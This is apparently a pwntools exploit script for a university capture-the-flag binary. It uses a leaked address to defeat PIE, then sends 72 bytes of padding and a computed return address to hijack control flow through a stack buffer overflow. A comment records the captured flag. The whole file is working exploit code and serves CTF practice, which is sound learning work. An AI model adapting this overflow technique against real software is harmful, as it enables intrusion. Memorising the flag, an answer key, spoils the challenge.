from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99x.cs.ui.ac.id', 20002
LOCAL = True
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+42
        b *onegaishimasu+22
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

print(p.recv())
p.sendline(b'1')
leaks = p.recvline()
print(f"Got leaks: {leaks}")
leak_address = leaks.decode().split(" ")[-2]
print(f"Got leak at: {leak_address}")
nanikore_address = leaks.decode().split(" ")[-1]
print(f"Got nanikore at: {nanikore_address}")

offset_target_leak = 0x000000000000089a - 0x00000000000008dd
target_address = int(leak_address, 16) + offset_target_leak
target = p64(target_address)
print(f"Derived target at: {hex(target_address)}")

print(p.recv())
p.sendline(b'2')
print(p.recv())

dummy = b'A' * (64 + 8)
payload = dummy + target
p.sendline(payload)

if LOCAL:
    sleep(2)
    print(p.recv().decode())
    pause()
else:
    print(p.recvall().decode())  # CSCE604258{60T_7O_PIe_A51r_99}
